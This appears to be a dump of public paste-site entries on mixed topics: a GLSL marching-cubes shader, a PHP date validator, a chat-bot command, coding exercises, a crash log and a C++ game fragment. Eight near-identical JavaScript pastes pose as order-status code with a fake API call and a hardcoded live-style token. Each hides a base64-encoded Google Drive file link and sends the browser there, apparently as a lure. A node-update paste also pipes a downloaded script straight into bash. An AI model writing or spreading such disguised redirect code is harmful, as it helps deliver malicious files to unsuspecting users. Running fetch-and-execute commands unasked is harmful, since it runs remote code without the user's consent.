    int[16]( 0,  8,  3,  1,  2,  7,  1,  7,  5,  7,  2, 11, -1, -1, -1, -1),
    int[16]( 9,  7,  5,  9,  2,  7,  9,  0,  2,  2, 11,  7, -1, -1, -1, -1),
    int[16]( 7,  5,  2,  7,  2, 11,  5,  9,  2,  3,  2,  8,  9,  8,  2, -1),
    int[16]( 2,  5, 10,  2,  3,  5,  3,  7,  5, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 8,  2,  0,  8,  5,  2,  8,  7,  5, 10,  2,  5, -1, -1, -1, -1),
    int[16]( 9,  0,  1,  5, 10,  3,  5,  3,  7,  3, 10,  2, -1, -1, -1, -1),
    int[16]( 9,  8,  2,  9,  2,  1,  8,  7,  2, 10,  2,  5,  7,  5,  2, -1),
    int[16]( 1,  3,  5,  3,  7,  5, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  8,  7,  0,  7,  1,  1,  7,  5, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  0,  3,  9,  3,  5,  5,  3,  7, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9,  8,  7,  5,  9,  7, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),  // 0xD0
	int[16]( 5,  8,  4,  5, 10,  8, 10, 11,  8, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 5,  0,  4,  5, 11,  0,  5, 10, 11, 11,  3,  0, -1, -1, -1, -1),
    int[16]( 0,  1,  9,  8,  4, 10,  8, 10, 11, 10,  4,  5, -1, -1, -1, -1),
    int[16](10, 11,  4, 10,  4,  5, 11,  3,  4,  9,  4,  1,  3,  1,  4, -1),
    int[16]( 2,  5,  1,  2,  8,  5,  2, 11,  8,  4,  5,  8, -1, -1, -1, -1),
    int[16]( 0,  4, 11,  0, 11,  3,  4,  5, 11,  2, 11,  1,  5,  1, 11, -1),
    int[16]( 0,  2,  5,  0,  5,  9,  2, 11,  5,  4,  5,  8, 11,  8,  5, -1),
    int[16]( 9,  4,  5,  2, 11,  3, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2,  5, 10,  3,  5,  2,  3,  4,  5,  3,  8,  4, -1, -1, -1, -1),
    int[16]( 5, 10,  2,  5,  2,  4,  4,  2,  0, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3, 10,  2,  3,  5, 10,  3,  8,  5,  4,  5,  8,  0,  1,  9, -1),
    int[16]( 5, 10,  2,  5,  2,  4,  1,  9,  2,  9,  4,  2, -1, -1, -1, -1),
    int[16]( 8,  4,  5,  8,  5,  3,  3,  5,  1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  4,  5,  1,  0,  5, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 8,  4,  5,  8,  5,  3,  9,  0,  5,  0,  3,  5, -1, -1, -1, -1),
    int[16]( 9,  4,  5, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),  // 0xE0
	int[16]( 4, 11,  7,  4,  9, 11,  9, 10, 11, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  8,  3,  4,  9,  7,  9, 11,  7,  9, 10, 11, -1, -1, -1, -1),
    int[16]( 1, 10, 11,  1, 11,  4,  1,  4,  0,  7,  4, 11, -1, -1, -1, -1),
    int[16]( 3,  1,  4,  3,  4,  8,  1, 10,  4,  7,  4, 11, 10, 11,  4, -1),
    int[16]( 4, 11,  7,  9, 11,  4,  9,  2, 11,  9,  1,  2, -1, -1, -1, -1),
    int[16]( 9,  7,  4,  9, 11,  7,  9,  1, 11,  2, 11,  1,  0,  8,  3, -1),
    int[16](11,  7,  4, 11,  4,  2,  2,  4,  0, -1, -1, -1, -1, -1, -1, -1),
    int[16](11,  7,  4, 11,  4,  2,  8,  3,  4,  3,  2,  4, -1, -1, -1, -1),
    int[16]( 2,  9, 10,  2,  7,  9,  2,  3,  7,  7,  4,  9, -1, -1, -1, -1),
    int[16]( 9, 10,  7,  9,  7,  4, 10,  2,  7,  8,  7,  0,  2,  0,  7, -1),
    int[16]( 3,  7, 10,  3, 10,  2,  7,  4, 10,  1, 10,  0,  4,  0, 10, -1),
    int[16]( 1, 10,  2,  8,  7,  4, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4,  9,  1,  4,  1,  7,  7,  1,  3, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4,  9,  1,  4,  1,  7,  0,  8,  1,  8,  7,  1, -1, -1, -1, -1),
    int[16]( 4,  0,  3,  7,  4,  3, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 4,  8,  7, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),  // 0xF0
	int[16]( 9, 10,  8, 10, 11,  8, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  0,  9,  3,  9, 11, 11,  9, 10, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  1, 10,  0, 10,  8,  8, 10, 11, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  1, 10, 11,  3, 10, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  2, 11,  1, 11,  9,  9, 11,  8, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  0,  9,  3,  9, 11,  1,  2,  9,  2, 11,  9, -1, -1, -1, -1),
    int[16]( 0,  2, 11,  8,  0, 11, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 3,  2, 11, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2,  3,  8,  2,  8, 10, 10,  8,  9, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 9, 10,  2,  0,  9,  2, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 2,  3,  8,  2,  8, 10,  0,  1,  8,  1, 10,  8, -1, -1, -1, -1),
    int[16]( 1, 10,  2, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 1,  3,  8,  9,  1,  8, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  9,  1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16]( 0,  3,  8, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1),
    int[16](-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1) 
);

float NodeAt(uvec3 aIndex)
{
    const uint WidthSlice = Size.x;
    const uint DepthSlice = WidthSlice * Size.y;

    return float(NodeData[aIndex.x 
                    + aIndex.y * WidthSlice
                    + aIndex.z * DepthSlice]);
}

vec3 Lerp(vec3 a, vec3 b, float v)
{
    return a + (b - a) * v;
}

float InverseLerp(float a, float b, float v)
{
    return (v - a) / (b - a);
}

vec4 PointOnEdge(int aFirst, int aSecond)
{
    uvec3 at = gl_GlobalInvocationID.xyz;

    float weight = InverseLerp(
                        NodeAt(at + Corners[aFirst]), 
                        NodeAt(at + Corners[aSecond]), 
                        Surface);

    return vec4(vec3(at) + Lerp(
                        vec3(Corners[aFirst]), 
                        vec3(Corners[aSecond]), 
                        weight), 0);
}


void main() {
    
    uvec3 at = gl_GlobalInvocationID.xyz;

    uint index = 0;
    for (int i = 0; i < 8; i++)
    {
        if (NodeAt(at + Corners[i]) >= Surface)
        {
            index += 1 << i;
        }
    }

    vec4[12] edges = vec4[12]
    (
        PointOnEdge(0, 1),
        PointOnEdge(1, 2),
        PointOnEdge(2, 3),
        PointOnEdge(3, 0),
        PointOnEdge(4, 5),
        PointOnEdge(5, 6),
        PointOnEdge(6, 7),
        PointOnEdge(7, 4),
        PointOnEdge(0, 4),
        PointOnEdge(1, 5),
        PointOnEdge(2, 6),
        PointOnEdge(3, 7)
    );

    for (int i = 0; i < 5; i++)
    {
        if (TriTable[index][i * 3 + 0] == -1)
            break;

        uint index = atomicAdd(TriCount, 1);

        if (index >= MaxTris)
            return;
			
		// Placeholder calculations
        Tris[index].a = vec4(1,0,0,0) * NodeAt(at);//edges[TriTable[index][i * 3 + 0]];
        Tris[index].b = vec4(0,0,1,0) * NodeAt(at);//edges[TriTable[index][i * 3 + 1]];
        Tris[index].c = vec4(0,1,0,0) * NodeAt(at);//edges[TriTable[index][i * 3 + 2]];
    }
}"
3nFeFPMr,Products.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 03:30:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62364/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5KF6SK4E,Order.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 03:15:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02039/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SRG9zm9A,Market.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 02:59:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96290/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eAzpg4fN,wcfm-booking-avialability-date-format-validity-check,palsushobhan,PHP,Saturday 19th of April 2025 02:43:15 AM CDT,"add_action('after_wcfm_products_manage', function() {
    ?>
    <script>
        jQuery(function($) {
            $( document.body ).on( 'wcfm_form_validate', function(event, elem) {
                let $elem = $(elem);
                let $datePickers = $elem.find('input.wcfm_datepicker.hasDatepicker');
                if($datePickers.length) {
                    $datePickers.each( function() {
                        let $datePicker = $(this);
                        if($datePicker.attr('placeholder')!=='YYYY-MM-DD' || !$datePicker.val()) return;
                        if(!isValidDate($datePicker.val())) {
                            if( $wcfm_is_valid_form ) 
                            $('#' + $elem.attr('id') + ' .wcfm-message').html( '<span class=""wcicon-status-cancelled""></span>Invalid date. Use YYYY-MM-DD format.').addClass('wcfm-error').slideDown();
                            else
                            $('#' + $elem.attr('id') + ' .wcfm-message').append( '<br /><span class=""wcicon-status-cancelled""></span>Invalid date. Use YYYY-MM-DD format.' );
                        
                            $wcfm_is_valid_form = false;
                            $datePicker.removeClass('wcfm_validation_success').addClass('wcfm_validation_failed');
                            return;
                        }
                    });
                }
            });
            function isValidDate(dateString) {
                const dateFormatRegex = /^\d{4}-\d{2}-\d{2}$/;
                if (!dateFormatRegex.test(dateString)) {
                    return false;
                }

                const parts = dateString.split(""-"");
                const year = parseInt(parts[0], 10);
                const month = parseInt(parts[1], 10);
                const day = parseInt(parts[2], 10);

                const date = new Date(year, month - 1, day);

                return !isNaN(date.getTime()) &&
                    date.getFullYear() === year &&
                    date.getMonth() === month - 1 &&
                    date.getDate() === day;
            }
        });
    </script>
    <?php
});"
jr6gbLzw,Untitled,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 02:42:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63715/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cZebE3QB,Products.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 02:27:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66859/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
h4JzR9d3,Order.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 02:12:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83065/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WuHAzpc6,Untitled,SilkKheldar,JavaScript,Saturday 19th of April 2025 02:01:34 AM CDT,"let version  = ""1.0"";
let createdt = ""19 april 2025"";
let usage    = '!addcom !at -ul=moderator -cd=5 $(eval u=""$(querystring)"";$(urlfetch json https://pastebin.com/raw/WuHAzpc6))';
let designer = ""Silkenator23"";
let o        = """";
let r        = """";
let u2       = """";  
 
let max_len  = 200; 
let m_s_len  = 39; 
let m_l_len  = 39; 
let u_len    = 0;      
 
m_l=""Kriket is playing in Canberra Australia"";
m_s=""Kriket is playing in Canberra Australia"";
if(u)
  {
    u2 = decodeURIComponent(u);
    u_len = u2.length + 1;
    if((u_len + m_l_len) <= max_len) 
      {
        o = u2 + ' ' + m_l;
      }
    else
      { 
        if((u_len + m_s_len) <= max_len)
          {
            o = u2 + ' ' + m_s;
          }
        else
          {
             u2s = u2.slice(0,(max_len - m_s_len));
             o = u2s + ' ' + m_s;
          }          
      }
   }
else
  {
    o = m_l;
  }
 
o; "
yCbCwRKN,bunny,InfraRaven,JavaScript,Saturday 19th of April 2025 01:59:28 AM CDT,"(function () {
    if (OWOP.bunnyRun) return OWOP.bunnyRun.toggle();

    const container = document.getElementById(""toole-container"");
    if (!container) return alert(""Tool container not found"");

    const tools = [...container.children];
    OWOP.bunnyRun = {
        active: true,
        tools: tools,
        positions: [],
        ears: [],
        setup() {
            container.style.overflow = ""visible"";
            this.tools.forEach((tool, i) => {
                tool.style.position = ""absolute"";
                tool.style.left = ""0px"";
                tool.style.top = i * 42 + ""px"";
                this.positions[i] = { x: 0, y: i * 42 };

                // Add bunny ears
                const ear = document.createElement(""div"");
                ear.style.position = ""absolute"";
                ear.style.top = ""-8px"";
                ear.style.left = ""6px"";
                ear.style.width = ""8px"";
                ear.style.height = ""12px"";
                ear.style.background = ""#fff"";
                ear.style.borderRadius = ""4px 4px 0 0"";
                ear.style.border = ""1px solid #000"";
                ear.style.zIndex = ""9"";
                tool.appendChild(ear);
                this.ears[i] = ear;

                // Hopping behavior
                tool.onmouseover = () => this.jump(i);
            });
        },
        jump(i) {
            const pos = this.positions[i];
            const dx = (Math.random() - 0.5) * 80;
            const dy = (Math.random() - 0.5) * 80;
            pos.x += dx;
            pos.y += dy;
            const tool = this.tools[i];
            tool.style.left = pos.x + ""px"";
            tool.style.top = pos.y + ""px"";
        },
        toggle() {
            this.active = !this.active;
            if (!this.active) {
                this.tools.forEach((tool, i) => {
                    tool.style.left = ""0px"";
                    tool.style.top = i * 42 + ""px"";
                    this.positions[i] = { x: 0, y: i * 42 };
                });
            }
        }
    };

    OWOP.bunnyRun.setup();
})();
"
XuEfpTtZ,Market.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 01:56:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15903/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
b7cQ4zzq,Untitled,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 01:41:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99669/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
p7YzQvNG,Gaia Update + Domain connect,EvenoR,Bash,Saturday 19th of April 2025 01:33:44 AM CDT,"#UPDATE YOUR NODE
#1
gaianet stop

#2
curl -sSfL 'https://github.com/GaiaNet-AI/gaianet-node/releases/latest/download/install.sh' | bash

#3
source $HOME/.bashrc

#4
gaianet start

#CHECK CONFIG

nano ~/gaianet/config.json
#UPDATE (IF NEEDED)
1#

gaianet stop
#2

gaianet config --domain gaia.domains
#3

gaianet init
#4

gaianet start

#DOWNLOAD&LAUNCH DOMAIN AUTOBOT
#1
git clone https://github.com/Evenorchik/gaiadomain gaia-domain-bot
#2
pip install aiohttp
#3
cd gaia-domain-bot
#4
screen -S gaia_domain_bot
#5
python3 autobot.py
#6
evchat.gaia.domains
"
KNxMWpMK,C. Пара последовательностей с одинаковой суммой,Korotkodul,C++,Saturday 19th of April 2025 01:20:27 AM CDT,"#include <iostream>
#include <vector>
#include <map>
using namespace std;


int main() {
    int n; cin >> n;
    vector <int> a(n), b(n), pfa(n), pfb(n);
    for (int &el: a) cin >> el;
    pfa[0] = a[0];
    for (int i = 1; i < n; ++i) {
        pfa[i] = pfa[i - 1] + a[i];
    }
    for (int &el: b) cin >> el;
    pfb[0] = b[0];
    for (int i = 1; i < n; ++i) {
        pfb[i] = pfb[i - 1] + b[i];
    }
    if (pfa[n - 1] == pfb[n - 1]) {
        cout << n << ""\n"";
        exit(0);
    }
    vector <int> dif(n);
    for (int i = 0; i < n; ++i) {
        dif[i] = pfa[i] - pfb[i];
    }
    map <int, int> met;
    met[0] = -1;
    int ans = 0;
    for (int i = 0; i < n; ++i) {
        if (met.find(dif[i]) != met.end()) {
            ans = max(ans, i - met[i] + 1);
        } else {
            met[dif[i]] = i;
        }
    }
    cout << ans << ""\n"";
}
"
ZzMH1WaJ,tree3,Korotkodul,C++,Saturday 19th of April 2025 01:04:59 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int inf = 2e9;

struct node {
    node* parent;
    node* l;
    node* r;
    int val;

    node(node* par) : parent(par), l(nullptr), r(nullptr), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), val(inf) {}
};

struct tree {
    vector<int> arr; // используется ТОЛЬКО для инициализации дерева
    node* main_root; // Изменен на указатель для удобства
    int cur_size = 0;

    // Создает поддерево
    node* create_subtree(node* par, int Li, int Ri) {
        if (Li > Ri) return nullptr; // Проверка на правильные границы

        node* root = new node(par);
        root->val = arr[(Ri + Li) / 2]; // устанавливаем значение корня

        // Создание левого и правого поддеревьев
        root->l = create_subtree(root, Li, (Ri + Li) / 2 - 1);
        root->r = create_subtree(root, (Ri + Li) / 2 + 1, Ri);

        return root; // Возвращаем указатель на созданный узел
    }

    // Инициализация дерева
    void create(vector<int> a) {
        arr = a;
        cur_size = a.size();
        if (a.size() == 0) {
            main_root = nullptr; // В случае пустого массива
        } else {
            main_root = create_subtree(nullptr, 0, arr.size() - 1);
        }
        cout << ""Tree created\n"";
    }

    // Обход дерева (in-order)
    void trav(node* root) {
        if (root == nullptr) return; // Проверка на nullptr
        trav(root->l); // Обход левого поддерева
        cout << root->val << "" ""; // Обработка текущего узла
        trav(root->r); // Обход правого поддерева
    }

    void replace_el(node* root, int Li, int Ri, int i, int x) {
        if (root == nullptr) return;

        int mid = (Li + Ri) / 2;
        if (i == mid) {  // Нашли узел, который нужно заменить
            root->val = x;
            return;
        }

        if (i < mid) {
            replace_el(root->l, Li, mid - 1, i, x);  // Ищем в левом поддереве
        } else {
            replace_el(root->r, mid + 1, Ri, i, x);  // Ищем в правом поддереве
        }
    }
};

int main() {
    tree T;
    vector<int> a = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21};
    T.create(a);
    cout << ""TRAVERSAL ORDER:\n"";
    T.trav(T.main_root); cout << ""\n"";
    /*T.replace_el(T.main_root, 0, T.cur_size - 1, 0, 999);
    T.trav(T.main_root); cout << ""\n"";
    T.replace_el(T.main_root, 0, T.cur_size - 1, 18, 999);
    T.trav(T.main_root); cout << ""\n"";*/
    for (int i = 0; i < 21; ++i) {
        T.replace_el(T.main_root, 0, T.cur_size - 1, i, 999);
        T.trav(T.main_root); cout << ""\n"";
    }

    // Освобождение памяти
    // Здесь может быть реализована функция для удаления дерева и освобождения памяти
    return 0;
}
"
Wrsd90DC,Untitled,smj007,Python,Saturday 19th of April 2025 01:01:56 AM CDT,"class Solution:
    def mergeAlternately(self, word1: str, word2: str) -> str:
      
        i = 0
        j = 0
        answer = """"

        while (i<len(word1) and j<len(word2)):
            answer += word1[i] + word2[j]
            i += 1
            j += 1

        while (i < len(word1)):
            answer += word1[i]
            i += 1

        while (j < len(word2)):
            answer += word2[j]
            j += 1

        return answer"
GmVCd5rT,2025-04-19T08:57:29.734001,powerampache,PHP,Saturday 19th of April 2025 12:57:30 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:958)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:224)
	at android.os.Looper.loop(Looper.java:318)
	at android.app.ActivityThread.main(ActivityThread.java:8790)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:561)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1013)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[]}"
s67rSv19,Untitled,smj007,Python,Saturday 19th of April 2025 12:45:53 AM CDT,"class Solution:
 
    def validPalindrome(self, s: str) -> bool:

        def helper(s: str, left:int, right: int, count: int) -> bool:
            # Base case
            if count > 1:
                return False

            # Base case
            if left >= right:
                return True

            # recursive function
            if s[left] != s[right]:
                return helper(s, left+1, right, count+1) or helper(s, left, right-1, count+1)
            else:
                # left += 1
                # right -= 1
                return helper(s, left+1, right-1, count)

        return helper(s, 0, len(s)-1, 0)
        "
LhDYsqRC,"2D-Racing-App Improved, Big Chunk O' Mess!",alien_fx_fiend,C++,Saturday 19th of April 2025 12:43:21 AM CDT,"==++ Here's the full source for (file 1/1) ""RaceCar.cpp""::: ++==
```RaceCar.cpp
#include <Windows.h>
#include <ctime>
#include <cstdlib>
#include <math.h>
#include <stdio.h>
#include <string>
#include ""resource.h""  // Add this with your other includes

// Global Variables
const int WIDTH = 1366;
const int HEIGHT = 768;
const int ROAD_WIDTH = 200;
const int CAR_WIDTH = 50;
const int CAR_HEIGHT = 100;
const int TYRE_SIZE = 10;
const int FPS = 60;
const int TIMER = 4;
const int TURN_RADIUS = 5;
const double PI = 3.14159265358979323846;
const double M_PI = 3.14159265358979323846;

int playerX = 100;
int playerY = HEIGHT - CAR_HEIGHT - 50;
int playerSpeedX = 0;
int playerSpeedY = 0;
int aiX = playerX + CAR_WIDTH + 20;
int aiY = playerY;
